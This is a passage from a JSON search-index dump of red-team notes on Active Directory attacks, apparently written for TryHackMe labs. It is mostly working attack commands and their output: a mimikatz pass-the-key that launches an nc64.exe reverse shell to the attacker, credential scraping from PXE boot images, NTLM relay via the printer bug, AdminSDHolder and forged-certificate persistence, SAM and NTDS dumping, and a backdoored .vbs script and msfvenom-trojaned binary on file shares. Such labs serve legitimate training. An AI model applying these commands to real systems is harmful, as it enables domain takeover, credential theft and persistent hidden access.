attack is similar to PtH but then for Kerberos networks. Obtain the Kerberos encryption keys from memory with mimikatz: mimikatz # privilege::debug mimikatz # sekurlsa::ekeys Get a reverse shell. Depending on the available keys: RC4: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" AES128 hash: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" If we have the AES256 hash: mimikatz # sekurlsa::pth /user:Administrator...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8239fe7cc428a764d7a64693a8826c23",
    "u": "https://ad.tymyrddin.dev/docs/enum/cleanup",
    "t": "Cleanup ",
    "c": "Cleanup  Remove the sharphound zip and directory. Close bloodhound. Stop neo4j: neo4j stop To stop the vpn daemon started in setup , get PID: sudo ps aux | grep -v grep | grep -i <username>-adenumeration.ovpn | awk -v FS=' ' '{print $2}' <PID> and kill the process: sudo kill -9 <PID> Remove the IP address of the THMDC in DNS IPv4 setting and run: sudo systemctl restart NetworkManager Done.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "96abb3df713940a6a67acbc0985ffd9e",
    "u": "https://ad.tymyrddin.dev/docs/enum/bloodhound",
    "t": "Through Bloodhound ",
    "c": "Through Bloodhound  Bloodhound runs locally on an attacker’s machine. The attacker must run a “collector” like sharphound on the target to enumerate domain information. After the collector finishes running, it will output a series of .json files for import into the Bloodhound interface. On the attack machine: mkdir sharphound cd sharphound wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip --2022-10-12 14:20:23-- https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip ... HTTP request sent, awaiting response... 200 OK Length: 2138953 (2.0M) [application/octet-stream] Saving to: ‘SharpHound-v1.1.0.zip’ SharpHound-v1.1.0.z 100%[===================>] 2.04M 1.91MB/s in 1.1s 2022-10-12 14:20:35 (1.91 MB/s) - ‘SharpHound-v1.1.0.zip’ saved [2138953/2138953] Start a server to serve it: python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Now ssh into target machine using the credentials given: ssh kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com In the target machine terminal, switch to powershell: za\\kenneth.davies@THMJMP1 C:\\Users\\kenneth.davies\\Documents>powershell Choose a directory to work from (I used Documents , and download the SharpHound-v1.1.0.zip from the http server on the attack machine: PS C:\\Users\\kenneth.davies\\Documents> Invoke-WebRequest http://10.50.16.168/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1.0.zip Extract: PS C:\\Users\\kenneth.davies\\Documents> Expand-Archive SharpHound-v1.1.0.zip Enumerate: PS C:\\Users\\kenneth.davies\\Documents> cd SharpHound-v1.1.0 PS C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0> .\\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs 2022-10-12T14:49:52.7476245+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound ... 2022-10-12T14:50:42.7872718+01:00|INFORMATION|SharpHound Enumeration Completed at 2:50 PM on 10/12/2022! Happy Graphing! Get name of results: PS C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0> dir Directory: C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/12/2022 2:50 PM 139831 20221012145038_BloodHound.zip ... On the attack machine, use ssh to copy the bloodhound results over: scp kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/kenneth.davies/Documents/SharpHound-v1.1.0/20221012145038_BloodHound.zip . Fire up neo4j and bloodhound : sudo neo4j start bloodhound & Drop the copied over results in the bloodhound window, and play around with options. Start playing around and answer the questions. Use Search for a node... to find specific users, groups, etc. Click on specific properties of an object to visualise it Use the Analysis tab to run built-in queries …",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6d7e57e9e8e0f823a495f6ef00c405ef",
    "u": "https://ad.tymyrddin.dev/docs/breach/mdt",
    "t": "Microsoft Deployment Toolkit ",
    "c": "Microsoft Deployment Toolkit  Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you can’t have your IT personnel running around with DVDs or USB Flash for installing software on every single machine. Microsoft Deployment Toolkit (MDT) is used to deploy operating systems over the network using PXE boot; SCCM is used to manage hosts after they’ve been provisioned. Both of these technologies have the advantage of being a centralised management system for hosts. And, they also represent a massive attack surface. If an attacker can pretend to be a PXE booting client on the network and request an image from MDT via a DHCP request, then the attacker could inject or scrape information from the PXE image during and after the setup process. SSH into the jump host with password Password1@ : ssh thm@THMJMP1.za.tryhackme.com Create a working directory for the session using your username and copy the powerpxe directory into it: powershell -ep bypass mkdir Barzh cd Barzh cp -Recurse C:\\powerpxe . Go to http://pxeboot.za.tryhackme.com/ Pretend to be a PXE client sending a DHCP request and receiving a list of BCD files for configuration. Copy the file name. Use TFTP to connect to the MDT server and retrieve the BCD file and scrape it for credentials: tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET \"\\Tmp\\x64{BFA810B9-DF7D-401C-B5B6-2F4D37258344}.bcd\" conf.bcd Now have downloaded the BCD file and copied the powerpxe folder. Get the location of the WIM file, the Windows bootable image. Import-Module .\\powerpxe\\PowerPXE.ps1 $bcdfile = \"conf.bcd\" Get-WimFile -bcdFile $bcdfile >> Parse the BCD file: conf.bcd >>>> Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim \\Boot\\x64\\Images\\LiteTouchPE_x64.wim We know the path to download the image: $wimfile = '\\Boot\\x64\\Images\\LiteTouchPE_x64.wim' $mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress tftp -i $mdtserver GEt \"$wimfile\" pxeboot.wim Transfer successful: 341899611 bytes in 277 second(s), 1234294 bytes/s Scrape the image for credentials: Get-FindCredentials -WimFile .\\pxeboot.wim >>>> Finding Bootstrap.ini >>>> >>>> DeployRoot = \\\\THMMDT\\MTDBuildLab$ >>>> >>>> UserID = svcMDT >>>> >>>> UserDomain = ZA >>>> >>>> UserPassword = PXEBootSecure1@",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d9ce460772bcbe2e0da49eaae42665ff",
    "u": "https://ad.tymyrddin.dev/docs/persist/acls",
    "t": "Persistence through ACLs ",
    "c": "Persistence through ACLs  Active Directory has a process called SDProp that replicates a template called AdminSDHolder to all protected groups in the domain. If an attacker adds their user account to the AdminSDHolder template, SDProp will replicate the ACL to all the protected groups when it runs every 60 minutes. So even if the attacker is removed from privileged groups, they will be re-added at very cycle by SDProp . RDP to thmwrk1 with the unprivileged user account: xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'user.name' /p:'Password' Inject the network credentials of the domain administrator into a session: runas /netonly /user:za.tryhackme.loc\\Administrator cmd.exe Modify the AdminSDHolder template  From the command prompt running with the injected domain admin credential, run mmc.exe . Go to File -> Add/Remove Snap-in Add the Active Directory Users and Computers snap-in. Add the unprivileged user to the ACL here and allow Full Control for the user. Manually start the SDProp sync procedure. WinRM to the Domain Controller  In the injected session, enter a PowerShell session: powershell -ep bypass WinRM to the domain controller as the DA: Enter-PSSession -ComputerName thmdc.za.tryhackme.loc Now running a PowerShell session on the domain controller: Import-Module C:\\Tools\\Invoke-ADSDPropagation.ps1 Invoke-ADSDPropagation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "95e32a08fb46c6f4e89881a63a177cd6",
    "u": "https://ad.tymyrddin.dev/docs/exploit/gpos",
    "t": "Exploiting GPOs ",
    "c": "Exploiting GPOs  The KeePass vault from the users post-exploit step revealed a service account credential. Searching for this user in the Bloodhound data reveals an interesting ownership over a GPO. GPOs are saved in the SYSVOL directory when they are synchronized from the domain controller. RDP into THMWRK1 as standard domain user or T2 admin Inject the svcServMan as a network credential Edit the GPO remotely on THMSERVER2 via MMC THMWRK1  RDP to THMWRK1: xfreerdp /v:thmwrk1.za.tryhackme.loc /u:t2_alan.riley /p:'Password123' Inject the Service Account Credentials (password = Sup3rStr0ngPass!@) runas /netonly /user:za.tryhackme.loc\\svcServMan cmd.exe mmc.exe Modify the Group Policy Object: Add Group -> Browse -> Search “IT Support” -> Click OK Make group a member of “IT Support” Administrators and Remote Desktop Users on THMSERVER2 This group policy applies to the path za.tryhackme.loc/Servers/Management Servers , as specified in the GPO path. Add the Active Directory Users and Computers snap-in to the mmc.exe session, and inspect the OU. THMWRK2  Use the low-level user credential received from http://distributor.za.tryhackme.loc/creds. This user is a member of the IT Support group after we added the user in Exploiting permission delegation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ac1ea874a898c587bf31bb6dce714320",
    "u": "https://ad.tymyrddin.dev/docs/enum/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<username>-adenumeration.ovpn --daemon Check PID (you get a number, if not, doesn’t work): sudo ps aux | grep -v grep | grep -i <username>-adenumeration.ovpn | awk -v FS=' ' '{print $2}' Set your DNS IPv4 to the IP address of the THMDC in the network diagram, and run: sudo systemctl restart NetworkManager Test: nslookup thmdc.za.tryhackme.com Get your credentials from http://distributor.za.tryhackme.com/creds . You can now either login with ssh , for example: $ ssh kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com ... kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com's password: Microsoft Windows [Version 10.0.17763.1098] (c) 2018 Microsoft Corporation. All rights reserved. Or by RPD: The kali-share drive mounts the current working directory as a network drive in the RDP session, for uploading and downloading files.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1cc2c978cadaae2d9c31c8516e73bb6e",
    "u": "https://ad.tymyrddin.dev/docs/exploit/relays",
    "t": "Exploiting automated relays ",
    "c": "Exploiting automated relays  We can force a computer account to initiate an authentication request. Computer accounts – like user accounts – have a username and password. Computer account usernames end in $ – for example, server01$ . Machine accounts  Use a custom Bloodhound query to find computer accounts that have admin rights over other computer accounts: MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p This query will attempt to find instances where a computer has the \"AdminTo\" relationship over another computer. The Printer Bug  The printer bug feature allows a domain user to force a computer account to connect to an arbitrary IP address. In order for this to work, the following must be true: Possess a valid set of AD credentials Target host is running SMB Target host is running Print Spooler service SMB signing must not be enforced Condition 1 and 2 have been met already. Verify the Print Spooler service is running  PS C:\\Users\\t2_alan.riley> Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc Name ComputerName Description PortMonitor ---- ------------ ----------- ----------- COM1: thmserver2.za.try... Local Port Local Monitor COM2: thmserver2.za.try... Local Port Local Monitor COM3: thmserver2.za.try... Local Port Local Monitor COM4: thmserver2.za.try... Local Port Local Monitor FILE: thmserver2.za.try... Local Port Local Monitor LPT1: thmserver2.za.try... Local Port Local Monitor LPT2: thmserver2.za.try... Local Port Local Monitor LPT3: thmserver2.za.try... Local Port Local Monitor PORTPROMPT: thmserver2.za.try... Local Port Local Monitor Verify SMB signing enforcement  $ sudo nmap -Pn -p445 --script=smb2-security-mode thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc [sudo] password for nina: Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 18:24 GMT Nmap scan report for thmserver1.za.tryhackme.loc (10.200.60.201) Host is up (0.080s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb2-security-mode: | 311: |_ Message signing enabled but not required Nmap scan report for thmserver2.za.tryhackme.loc (10.200.60.202) Host is up (0.041s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb2-security-mode: | 311: |_ Message signing enabled but not required Nmap done: 2 IP addresses (2 hosts up) scanned in 2.85 seconds $ dig thmserver1.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmserver1.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14249 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmserver1.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmserver1.za.tryhackme.loc. 3600 IN A 10.200.60.201 ;; Query time: 68 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 18:26:01 GMT 2022 ;; MSG SIZE rcvd: 72 Exploit authentication relay  Use NTLM authentication against the target – THMSERVER1 THMSERVER2 has administrative privileges over THMSERVER1 Use SpoolSample.exe to connect to THMSERVER2 and tell it to authenticate back to us Relay that authentication request to THMSERVER1 THMSERVER1 will see it as though we are connecting as THMSERVER2 , which will give us administrative privileges Set up the NTLM relay: $ python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://\"10.200.60.201\" -debug Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation [+] Impacket Library Installation Path: /usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220720.103933.3c6713e3-py3.10.egg/impacket ... [*] Servers started, waiting for connections Get IP address attack machine on the THM network: $ ifconfig ... exploitingad: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500 inet 10.50.57.175 netmask 255.255.255.0 destination 10.50.57.175 inet6 fe80::712c:cfa0:413f:458f prefixlen 64 scopeid 0x20<link> unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 53151 bytes 19626273 (18.7 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 61363 bytes 4371437 (4.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ... On THMWRK1 , exploit: PS C:\\Users\\t2_alan.riley> C:\\Tools\\SpoolSample.exe thmserver2.za.tryhackmloc \"10.50.57.175\" [+] Converted DLL to shellcode [+] Executing RDI [+] Calling exported function TargetServer: \\\\thmserver2.za.tryhackmloc, CaptureServer: \\\\10.50.57.175 A hashdump.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "aa2a007ed722013a27ae46faa643de33",
    "u": "https://ad.tymyrddin.dev/docs/exploit/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Exploiting Active Directory What?  Common AD exploitation techniques: A combination of lateral movement and privilege escalation. Why?  Reaching a suitable position to execute goals. How?  Setup for THM AD Exploiting permission delegation Exploiting kerberos delegation Exploiting automated relays Exploiting AD users Exploiting GPOs Exploiting certificates Exploiting domain trusts",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5fb18e6d06492e837c11189b46e41d68",
    "u": "https://ad.tymyrddin.dev/docs/pivot/cleanup",
    "t": "Cleanup ",
    "c": "Cleanup  To stop the vpn daemon started in setup , get PID: sudo ps aux | grep -v grep | grep -i <username>-lateralmovementandpivoting | awk -v FS=' ' '{print $2}' <PID> and kill the process: sudo kill -9 <PID> Remove the IP address of the THMDC in DNS IPv4 setting and run: sudo systemctl restart NetworkManager Done.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "574783abcaa7e2a42bb606f34c6e424a",
    "u": "https://ad.tymyrddin.dev/docs/persist/certs",
    "t": "Persistence through certificates ",
    "c": "Persistence through certificates  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. In Exploiting certificates , certificates were leveraged to become Domain Admins. Certificates can also be used for persistence. This attack revolves around taking the private key of the Certificate Authority (CA) of the domain. Armed with the private key, the attacker can now effectively “approve” their own Certificate Signing Requests (CSRs) and generate certificates to any user they please. In Kerberos authentication, a user can authenticate by providing their public key. SSH to the domain controller using the given domain administrator credential . Since the Active Directory Certificate Services (AD CS) services is running on the domain controller, the attack is executed on this host. ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Extract the CA’s Private Key  powershell -ep bypass Start Mimikatz: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe Enumerate certificates mimikatz # crypto::certificates /systemstore:local_machine Elevate privileges: mimikatz # privilege::debug Allow certificate export without private key: mimikatz # crypto::capi mimikatz # crypto::cng Export the certificates with private keys: mimikatz # crypto::certificates /systemstore:local_machine /export Exit: mimikatz # exit Create a certificate for the domain administrator account  List the certificate files. local_machine_My_1_za-THMDC-CA.pfx is the CA’s certificate with the private key: Get-ChildItem .\\*.pfx C:\\Tools\\ForgeCert\\ForgeCert\\ForgeCert.exe --CaCertPath .\\local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject 'CN=Pwned' --SubjectAltName 'Administrator@za.tryhackme.loc' --NewCertPath .\\domain-admin.pfx --NewCertPassword pwned123 Create the TGT using Rubeus and save it locally: C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:'.\\domain-admin.pfx' /password:'pwned123' /outfile:domain-admin.kirbi /domain:za.tryhackme.loc /dc:10.200.88.101 Use Mimikatz to inject the ticket into the session: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # kerberos::ptt domain-admin.kirbi Exit: mimikatz # exit Browse: dir \\\\thmdc.za.tryhackme.loc\\C$\\Users",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "342b50c6ff2a847f9dfa18c5436e6e85",
    "u": "https://ad.tymyrddin.dev/docs/harvest/lwc",
    "t": "Local Windows credentials ",
    "c": "Local Windows credentials  Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. And, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can use keylogging with tools like the Metasploit framework. An example use case can be found in Exploiting AD users . Security Account Manager (SAM)  The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. It can not be read and accessed by any users while the Windows operating system is running. And there are ways and attacks to dump the content of the SAM database. The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. Another approach uses the Microsoft Volume shadow copy service , which helps perform a volume backup while applications read/write on volumes. Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some SAM database contents to be used by Windows services. Shadow Copy  Use wmic (with administrator privileges) to create a shadow volume copy: Run the standard cmd.exe prompt with administrator privileges. Execute the wmic command to create a copy shadow of C: drive Verify the creation from step 2 is available. Copy the SAM database from the volume created in step 2 Copy shadow of C: drive: C:\\Users\\Administrator>wmic shadowcopy call create Volume='C:\\' To list and confirm that we have a shadow copy of the C: volume: C:\\Users\\Administrator>vssadmin list shadows A shadow copy volume was created: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 The SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need the decryption key stored in c:\\Windows\\System32\\Config\\system . Copy both files (sam and system) from the shadow copy volume to the desktop, and then to the attack machine. Registry Hives  Save the value of the Windows registry using the reg.exe tool (with Administrator privileges): C:\\Users\\Administrator\\Desktop>reg save HKLM\\sam C:\\users\\Administrator\\Desktop\\sam-reg C:\\Users\\Administrator\\Desktop>reg save HKLM\\system C:\\users\\Administrator\\Desktop\\system-reg Decrypt it using secretsdump.py: # python3 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "411116b699485ee4e9ddc3648a2eb2fd",
    "u": "https://ad.tymyrddin.dev/docs/pivot/behaviour",
    "t": "Abusing user behaviour ",
    "c": "Abusing user behaviour  Writable Shares  Discover a globally writable share Discovers credentials that allow access to a writable share As the share is enumerated, there are scripts or executable files on the server that may be run by several users. When a user runs the executable: A copy of the script/executable is made to a temporary directory on the user’s computer The executable is run on the user’s computer – not the server hosting the share This increases the attack surface for anyone with access to the share and executable files. Backdooring .vbs Scripts  If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script: CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\FILE-SERVER-IP\\share_name\\nc64.exe %tmp% & %tmp%\\nc64.exe -e cmd.exe <IP address attack machine> 80\", 0, True If a user runs this from the file share, the script will: Copy nc64.exe from the file server to the user’s temporary directory Give a reverse shell by executing nc64.exe and connecting to the attacker’s IP address on a specified port. Backdooring .exe Files  If the shared file is a Windows binary, say putty.exe, it can be downloaded from the share and be injected with a backdoor (msfvenom makes it easy): Copy the binary from the file share to the attack machine Use it as a template to create an imposter Place the imposter on the file share Start a listener and wait for it Create a malicious binary (noticeable by AV by the way): msfvenom -a x64 --platform windows -x /tmp/filename.exe -k -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=80 -b '\\x00' -f exe -o filename.exe RDP Session hijacking  When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, the session will remain open on the server indefinitely. With SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password. On Windows Server 2019 and newer, the attacker must know the password used to create the RDP session. Logged in as the Administrator and running a shell as NT AUTHORITY\\SYSTEM : C:\\> query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME >administrator rdp-tcp#6 2 Active . 4/1/2022 4:09 AM luke 3 Disc . 4/6/2022 6:51 AM For a RDP session that was not cleanly logged off and is suspended, attach it to the existing session, for example: tscon 3 /dest:rdp-tcp#6 Flag  Get a new set of credentials from http://distributor.za.tryhackme.com/creds_t2. Connect to THMJMP2 via RDP hijack t1_toby.beck ’s RDP session on THMJMP2 to get your flag. Hijack a session marked as disconnected (Disc.) to avoid interfering with other users.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "fdd910dbe4f2e99ce542fe0d97b14034",
    "u": "https://ad.tymyrddin.dev/docs/breach/config",
    "t": "Configuration files ",
    "c": "Configuration files  Suppose a breach that gave access to a host on the organisation’s network. In that case, configuration files are an excellent avenue to explore further for recovering (more) AD credentials. Depending on the host that was breached, configuration files may be available for such enumeration: Web application config files Service configuration files Registry keys Centrally deployed applications Eumeration scripts like Seatbelt could be used to automate this process. Configuration file credentials  The example here is the McAfee Enterprise Endpoint Security application, an endpoint detection and response (EDR) agent. The application stores an Active Directory credential in the C:\\ProgramData\\McAfee\\Agent\\DB\\ma.db file, which could be read by an attacker who has managed to gain a foothold on a host where this application is installed. The ma.db file is a SQLite file which can be read using the sqlite3 utility or the sqlitebrowser tool. We can use the SSH access on the jump host THMJMP1 again. Also, download the Python 2 script to crack the password hash. Secure Copy the File, using the password: Password1@ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db Inspect the data using sqlitebrowser or sqlite3 . Got to the AGENT_REPOSITORIES table and check out the DOMAIN , AUTH_USER , and AUTH_PASSWD columns. sqlite3 ./ma.db # List the tables in the database sqlite> .tables AGENT_CHILD AGENT_PROXIES MA_DATACHANNEL_MESSAGES AGENT_LOGS AGENT_PROXY_CONFIG AGENT_PARENT AGENT_REPOSITORIES # Dump the table schema sqlite> .schema AGENT_REPOSITORIES CREATE TABLE AGENT_REPOSITORIES(NAME TEXT NOT NULL UNIQUE, REPO_TYPE INTEGER NOT NULL, URL_TYPE INTEGER NOT NULL, NAMESPACE INTEGER NOT NULL, PROXY_USAGE INTEGER NOT NULL, AUTH_TYPE INTEGER NOT NULL, ENABLED INTEGER NOT NULL, SERVER_FQDN TEXT, SERVER_IP TEXT, SERVER_NAME TEXT,PORT INTEGER, SSL_PORT INTEGER,PATH TEXT, DOMAIN TEXT, AUTH_USER TEXT, AUTH_PASSWD TEXT, IS_PASSWD_ENCRYPTED INTEGER NOT NULL, PING_TIME INTEGER NOT NULL, SUBNET_DISTANCE INTEGER NOT NULL, SITELIST_ORDER INTEGER NOT NULL, STATE INTEGER NOT NULL, PRIMARY KEY (NAME) ON CONFLICT REPLACE); # Select the desired columns from the table sqlite> SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES; za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== # Exit sqlite3 sqlite> .quit We have the account username, svcAV , and an encrypted password stored as a base64 string. Reverse the encrypted password and use the script provided in the exercise files to crack it. encrypted_pw='jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==' python2 ./mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $encryped_pw The svcAV user account has password MyStrongPassword!",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "14994253874745013902cfd8d9d5460b",
    "u": "https://ad.tymyrddin.dev/docs/persist/gpos",
    "t": "Persistence through GPOs ",
    "c": "Persistence through GPOs  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup. While this is an excellent tool for management, it can be targeted by attackers to deploy persistence across the entire estate. What is even worse is that the attacker can often hide the GPO in such a way that it becomes almost impossible to remove it. Common GPO Persistence Techniques Restricted Group Membership Logon Script Deployment Firewall Tampering Anti-Virus Tampering Resources  Sneaky Active Directory Persistence #17: Group Policy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "60e0c38e4da5d4e63aec991ddf93519c",
    "u": "https://ad.tymyrddin.dev/docs/harvest/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Techniques for obtaining credentials like login information, account names, and passwords by extracting credential information from a system in various locations such as clear-text files, registry, memory dumping, etc. Why?  As a red teamer, gaining access to legitimate credentials has benefits: It can give access to systems (Lateral Movement). It makes it harder to detect our actions. It provides the opportunity to create and manage accounts to help achieve the end goals of a red team engagement. How?  Credential access Local Windows credentials Local Security Authority Subsystem Service Windows Credential Manager Domain Controller Local Administrator Password Solution Hashes and tickets",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "317b0c274ec1dc9dba591ab421436bd2",
    "u": "https://ad.tymyrddin.dev/docs/enum/injection",
    "t": "Credential injection ",
    "c": "Credential injection  There may be Active Directory credentials when we’ve landed a foothold on an unjoined host. We could try to use the network session to enumerate SYSVOL on the domain controller runas.exe /netonly /user:domain.tld\\username cmd.exe /netonly - use the credentials for network sessions only, all other commands run in the current user session on the local host /user - the user we want to authenticate as in network sessions cmd.exe spawn a new command prompt window with the injected network credential And enumerate SYSVOL : dir \\\\za.tryhackme.com\\SYSVOL Enumerating SYSVOL",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c0b0e2e0d5870ba02b9dca3339f80828",
    "u": "https://ad.tymyrddin.dev/docs/harvest/dc",
    "t": "Domain Controller ",
    "c": "Domain Controller  NTDS  NTDS is located in C:\\Windows\\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. And there are various ways to gain access to it. Get a copy of the NTDS file using the ntdsutil and Diskshadow tool and dump the file’s content. Decrypting the NTDS file requires a system Boot Key to decrypt LSA Isolated credentials. The Boot Key is stored in the SECURITY file system. Ntdsutil  Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios: Restore deleted objects in Active Directory. Perform maintenance for the AD database. Active Directory snapshot management. Set Directory Services Restore Mode (DSRM) administrator passwords. Local Dumping (No Credentials)  This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. To successfully dump the content of the NTDS file we need the following files: C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY To dump the NTDS file using the Ntdsutil tool in the C:\\temp directory: powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\" The c:\\temp directory now has two folders: Active Directory and registry, which contain the three files we need. Transfer them to the attack machine and run the secretsdump.py script to extract the hashes from the dumped memory file. c:\\temp\\Active Directory>scp .\\ntds.dit nina@10.18.22.77:/home/nina/Downloads/last/ The authenticity of host '10.18.22.77 (10.18.22.77)' can't be established. ECDSA key fingerprint is SHA256:RMXbGfqwBW5FiYWOSV2vVgv3+ypBISNAIlY/qZawIJ0. Are you sure you want to continue connecting (yes/no)? Warning: Permanently added '10.18.22.77' (ECDSA) to the list of known hosts. nina@10.18.22.77's password: ntds.dit 100% 24MB 1.2MB/s 00:20 c:\\temp\\Active Directory>cd ..\\registry c:\\temp\\registry>dir Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of c:\\temp\\registry 11/10/2022 01:53 AM <DIR> . 